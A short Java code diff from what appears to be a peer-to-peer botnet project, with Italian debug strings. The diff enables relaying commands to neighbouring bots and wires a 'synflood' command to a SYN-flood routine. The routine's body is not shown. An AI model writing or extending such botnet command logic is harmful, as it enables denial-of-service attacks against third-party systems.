@@ -205,11 +205,9 @@ public class Behavior {
 System.out.println("size lista "+ nServ.getNeighbours().getList().size());
 		for (Pairs<IP,PublicKey> p : nServ.getNeighbours().getList()) {
 			IP test=new IP(new String(p.getValue1().getIp().toString()));
-			System.out.println("test "+test);
-			System.out.println("pairs ip"+ p.getValue1().toString());
-			System.out.println("pairs ip"+ p.getValue1().getIp().toString());
+			System.out.println("vicino "+test);
 		
-//			req.sendFloodToOtherBot(p.getValue1(), msg);
+			req.sendFloodToOtherBot(p.getValue1(), msg);
 		}
 		
 //		nServ.getNeighbours().getList().forEach((pairs) -> {
@@ -228,8 +226,8 @@ System.out.println("size lista "+ nServ.getNeighbours().getList().size());
 		if(msg.startsWith("newking")){
 			foo(msg);
 		}
-		if(msg.startsWith("synflodd")){
-			
+		if(msg.startsWith("synflood")){
+			malS.synFlood(msg);
 		}
 		if(msg.startsWith("")){
 			
